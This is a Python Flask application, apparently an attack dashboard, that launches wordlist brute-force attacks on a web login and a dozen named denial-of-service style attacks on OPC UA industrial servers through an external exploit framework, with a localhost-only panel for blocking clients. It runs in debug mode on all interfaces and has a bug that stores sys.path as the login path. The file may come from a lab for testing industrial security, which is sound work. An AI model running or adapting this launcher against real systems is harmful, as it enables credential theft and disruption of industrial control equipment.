from flask import Flask, jsonify, request, render_template, abort
import os
import socket
import subprocess
import sys
import threading
import traceback
from functools import wraps

app = Flask(__name__)

connected_devices = {}
devices_lock = threading.Lock()

attack_lock = threading.Lock()
attack_processes = []
ATTEMPT_HISTORY = 200
attack_state = {
    'status': 'idle',
    'current_attack': None,
    'message': 'No attack started.',
    'found_password': None,
    'attempts': [],
    'logs': [],

    'opcua_ip': '',
    'opcua_port': 4840,
    'endpoint': '/freeopcua/server/',
    'server_type': 'prosys',

    'brute_force_ip': '',
    'brute_force_port': 5005,
    'brute_force_path': '/login'
}



def localhost_only(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if request.remote_addr not in ('127.0.0.1', '::1'):
            abort(403)
        return f(*args, **kwargs)
    return decorated

@app.route('/admin')
@localhost_only
def admin_dashboard():
    return render_template('admin_dashboard.html')

@app.route('/admin/devices')
@localhost_only
def get_devices():

    with devices_lock:
        devices = []

        for ip, device in connected_devices.items():
            devices.append({
                "ip": device.get("ip", ip),
                "connected": device.get("connected", False),
                "soft_blocked": device.get("soft_blocked", False)
            })

    return jsonify(devices)

@app.route('/admin/connect/<path:ip>', methods=['POST'])
@localhost_only
def connect_device(ip):

    with devices_lock:
        if ip in connected_devices:
            connected_devices[ip]['connected'] = True

    return jsonify({"success": True})

@app.route('/admin/disconnect/<path:ip>', methods=['POST'])
@localhost_only
def disconnect_device(ip):

    with devices_lock:
        if ip in connected_devices:
            connected_devices[ip]['connected'] = False

    return jsonify({"success": True})

@app.route('/admin/soft-block/<path:ip>', methods=['POST'])
@localhost_only
def soft_block(ip):

    with devices_lock:
        if ip in connected_devices:
            connected_devices[ip]["soft_blocked"] = True

    return jsonify({"success": True})

@app.route('/admin/unsoft-block/<path:ip>', methods=['POST'])
@localhost_only
def unsoft_block(ip):

    with devices_lock:
        if ip in connected_devices:
            connected_devices[ip]["soft_blocked"] = False

    return jsonify({"success": True})

def is_soft_blocked(ip):

    with devices_lock:
        device = connected_devices.get(ip)

        if not device:
            return False

        return device.get("soft_blocked", False)

def register_client():
    ip = request.remote_addr

    with devices_lock:
        if ip not in connected_devices:
            connected_devices[ip] = {
                "ip": ip,
                "connected": True
            }

def is_allowed_client():
    ip = request.remote_addr

    with devices_lock:
        if ip in connected_devices:
            return connected_devices[ip]['connected']

    return True

@app.before_request
def block_disconnected_clients():
    if request.path.startswith('/admin'):
        return

    ip = request.remote_addr

    with devices_lock:
        if ip in connected_devices:
            if not connected_devices[ip]['connected']:
                return "Disconnected by administrator", 403

def resolve_target_ip(ip_addr):
    # Don't auto-resolve — let the user specify the exact target IP
    return ip_addr


def get_local_ips():
    ip_set = set(['127.0.0.1'])
    try:
        hostname = socket.gethostname()
        for ip in socket.gethostbyname_ex(hostname)[2]:
            ip_set.add(ip)
    except Exception:
        pass

    # Use a UDP socket to infer the primary outbound IP
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip_set.add(s.getsockname()[0])
    except Exception:
        pass
    finally:
        try:
            s.close()
        except Exception:
            pass

    return sorted(ip_set)


def check_target_reachable(ip_addr, port, timeout=2):
    try:
        with socket.create_connection((ip_addr, port), timeout=timeout):
            return True, ''
    except Exception as e:
        return False, str(e)

# ----------------------------
# Attack Helper Functions
# ----------------------------

def run_bruteforce_attack(ip_addr, port, path='/login'):
    try:
        import brute_force
        # reset state
        brute_force.FOUND = False
        brute_force.FOUND_PASSWORD = None
        # allow custom login path
        if not path.startswith('/'):
            path = '/' + path
        brute_force.URL = f"http://{ip_addr}:{port}{path}"

        # Clear previous attempts
        with attack_lock:
            attack_state['attempts'].clear()
            attack_state['found_password'] = None

        # Read wordlist and submit attempts similar to brute_force.run_test
        try:
            with open(brute_force.WORDLIST_PATH, 'r', encoding='latin-1') as f:
                from concurrent.futures import ThreadPoolExecutor
                def worker(pw):
                    if brute_force.FOUND:
                        return
                    # record attempt (keep last 50)
                    with attack_lock:
                        attack_state['attempts'].append(pw)
                        if len(attack_state['attempts']) > ATTEMPT_HISTORY:
                            attack_state['attempts'] = attack_state['attempts'][-ATTEMPT_HISTORY:]
                        attack_state['message'] = f"Trying: {pw}"
                    brute_force.attempt_password(pw)
                    if brute_force.FOUND:
                        with attack_lock:
                            attack_state['found_password'] = brute_force.FOUND_PASSWORD
                            attack_state['message'] = f"Password found: {brute_force.FOUND_PASSWORD}"
                        return

                with ThreadPoolExecutor(max_workers=brute_force.THREADS) as ex:
                    for line in f:
                        if brute_force.FOUND:
                            break
                        pw = line.strip()
                        ex.submit(worker, pw)
        except FileNotFoundError:
            attack_state['message'] = 'Wordlist not found.'
            return

        if getattr(brute_force, 'FOUND_PASSWORD', None):
            attack_state['found_password'] = brute_force.FOUND_PASSWORD
            attack_state['message'] = f"Password found: {brute_force.FOUND_PASSWORD}"
        else:
            attack_state['message'] = 'Brute force finished without finding a password.'
    except Exception as e:
        attack_state['message'] = f'Brute force attack failed: {e}'
        print("[!] Brute force attack failed:", e)
    finally:
        attack_state['status'] = 'done'
        attack_state['current_attack'] = None


def run_exploit_framework_attack(attack_name, server_type, ip_addr, port, endpoint):
    main_script = os.path.join(os.path.dirname(__file__), "opcua-exploit-framework", "main.py")
    if not os.path.isfile(main_script):
        print("[!] Exploit framework main.py not found")
        return

    cmd = [sys.executable, main_script, server_type, ip_addr, str(port), endpoint, attack_name]
    try:
        # capture stdout so we can stream logs to the UI
        proc = subprocess.Popen(cmd, cwd=os.path.dirname(__file__), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        with attack_lock:
            attack_processes.append(proc)

        def reader_thread(p):
            try:
                for line in p.stdout:
                    line = line.rstrip('\n')
                    with attack_lock:
                        attack_state['logs'].append(line)
                        # keep logs trimmed
                        if len(attack_state['logs']) > 200:
                            attack_state['logs'] = attack_state['logs'][-200:]
                        attack_state['message'] = line
            except Exception as e:
                with attack_lock:
                    attack_state['logs'].append(f"[!] log reader error: {e}")

        threading.Thread(target=reader_thread, args=(proc,), daemon=True).start()
    except Exception as e:
        print("[!] Failed to start exploit framework attack:", e)


# ----------------------------
# Routes
# ----------------------------
@app.route('/update-settings', methods=['POST'])
def update_settings():
    ip = request.remote_addr
    if is_soft_blocked(ip):
        return jsonify({
            "success": False,
            "message": "Client is soft blocked."
        }), 403
    data = request.json

    print("UPDATE SETTINGS:", data)

    attack_state['brute_force_ip'] = data.get('brute_force_ip')
    attack_state['brute_force_port'] = data.get('brute_force_port')
    attack_state['brute_force_path'] = data.get('brute_force_path')

    attack_state['opcua_ip'] = data.get('opcua_ip')
    attack_state['opcua_port'] = data.get('opcua_port')
    attack_state['endpoint'] = data.get('endpoint')
    attack_state['server_type'] = data.get('server_type')

    return jsonify(success=True)


@app.route('/run-attack', methods=['POST'])
def run_attack():
    ip = request.remote_addr

    if is_soft_blocked(ip):
        return jsonify({
            "success": False,
            "message": "Client is soft blocked."
        }), 403
    data = request.json or {}
    attack_name = data.get('attack')
    attack_state['brute_force_ip'] = data.get('brute_force_ip')
    attack_state['brute_force_port'] = data.get('brute_force_port')
    attack_state['brute_force_path'] = data.get('brute_force_path')

    attack_state['opcua_ip'] = data.get('opcua_ip')
    attack_state['opcua_port'] = data.get('opcua_port')
    attack_state['endpoint'] = data.get('endpoint')
    attack_state['server_type'] = data.get('server_type')
    if attack_name == 'brute_force':
        ip_addr = data.get('brute_force_ip', '127.0.0.1')
        port = int(data.get('brute_force_port', 5005) or 5005)
        path = data.get('brute_force_path', '/login')
        original_ip = ip_addr
        ip_addr = resolve_target_ip(ip_addr)
        print(f"[attack_app] run_attack called: {attack_name} target={original_ip}:{port} path={path} resolved={ip_addr}")

        reachable, error = check_target_reachable(ip_addr, port)
        if not reachable:
            error_msg = f"Target {ip_addr}:{port} not reachable from attack host: {error}"
            print(f"[attack_app] {error_msg}")
            attack_state.update({'status': 'idle', 'message': error_msg})
            return jsonify({'success': False, 'error': error_msg}), 400

        if original_ip != ip_addr:
            attack_state['message'] = f"Resolved target {original_ip} to client host {ip_addr}."

        attack_state.update({
            'status': 'running',
            'current_attack': 'brute_force',
            'message': 'Running brute force...',
            'found_password': None,

            # sync settings to all dashboards
            'brute_force_ip': original_ip,
            'brute_force_port': port,
            'brute_force_path': sys.path
        })
        threading.Thread(target=run_bruteforce_attack, args=(ip_addr, port, path), daemon=True).start()
        message = 'Brute force attack started in background.'
    elif attack_name in ('certificate_inf_chain_loop', 'chunk_flood', 'close_session_with_old_timestamp', 'complex_nested_message', 'function_call_null_deref', 'malformed_uf8', 'open_multiple_secure_channels', 'race_change_and_browse_address_space', 'thread_pool_wait_starvation', 'translate_browse_path_call_stack_overflow', 'unlimited_condition_refresh', 'unlimited_persistent_subscriptions'):
        server_type = data.get('server_type', 'prosys')
        ip_addr = data.get('opcua_ip', '127.0.0.1')
        port = int(data.get('opcua_port', 4840) or 4840)
        endpoint = data.get('endpoint', '/freeopcua/server/')
        print(f"[attack_app] run_attack called: {attack_name} server_type={server_type} target={ip_addr}:{port} endpoint={endpoint}")

        attack_state.update({
            'status': 'running',
            'current_attack': attack_name,
            'message': f'{attack_name.replace("_", " ").title()} attack started.',
            'found_password': None,

            # sync settings to all dashboards
            'opcua_ip': ip_addr,
            'opcua_port': port,
            'endpoint': endpoint,
            'server_type': server_type
        })
        threading.Thread(target=run_exploit_framework_attack, args=(attack_name, server_type, ip_addr, port, endpoint), daemon=True).start()
        message = f'{attack_name.replace("_", " ").title()} attack started in background.'
    else:
        print(f"[attack_app] Unknown attack type: {attack_name}")
        return jsonify({'success': False, 'error': 'Unknown attack'}), 400

    return jsonify({'success': True, 'message': message})


def stop_attacks():
    stopped_any = False

    try:
        import brute_force
        if not brute_force.FOUND:
            brute_force.FOUND = True
        stopped_any = True
    except Exception:
        pass

    with attack_lock:
        for proc in attack_processes[:]:
            if proc.poll() is None:
                try:
                    proc.terminate()
                    proc.wait(timeout=3)
                except Exception:
                    try:
                        proc.kill()
                        proc.wait(timeout=3)
                    except Exception:
                        pass
                stopped_any = True
        attack_processes.clear()

    return stopped_any


@app.route('/stop-attack', methods=['POST'])
def stop_attack():
    print('[attack_app] stop_attack called')
    if stop_attacks():
        attack_state.update({
            'status': 'stopped',
            'message': 'Attack interrupted.',
            'current_attack': None
        })
        return jsonify({'success': True, 'message': 'Attack interrupt requested.'})
    return jsonify({'success': False, 'message': 'No running attack found.'}), 404


@app.route('/target-status')
def target_status():
    ip_addr = request.args.get('ip', '127.0.0.1')
    port = request.args.get('port', '4840')
    ip_addr = resolve_target_ip(ip_addr)
    try:
        port = int(port)
    except ValueError:
        return jsonify({'success': False, 'reachable': False, 'message': 'Invalid port'}), 400

    try:
        with socket.create_connection((ip_addr, port), timeout=2):
            return jsonify({'success': True, 'reachable': True, 'message': 'Reachable'})
    except Exception as e:
        return jsonify({'success': False, 'reachable': False, 'message': str(e)})


@app.route('/attack-status')
def attack_status():
    state = attack_state.copy()
    return jsonify(state)


@app.route('/')
def home():
    register_client()
    return render_template('attack_dashboard.html')


if __name__ == '__main__':
    try:
        available_ips = get_local_ips()
        print(f"[attack_app] Available local IPs: {', '.join(available_ips)}")
        print('[attack_app] Starting Flask on 0.0.0.0:5001 (accessible from other machines on the network)')
        app.run(host='0.0.0.0', debug=True, port=5001, use_reloader=False)
    except KeyboardInterrupt:
        print('\n[attack_app] Keyboard interrupt received, shutting down...')
        sys.exit(0)
    except Exception as e:
        print('[attack_app] Startup failed with exception:')
        traceback.print_exc()
        try:
            input('Press Enter to exit...')
        except Exception:
            pass
        sys.exit(1)

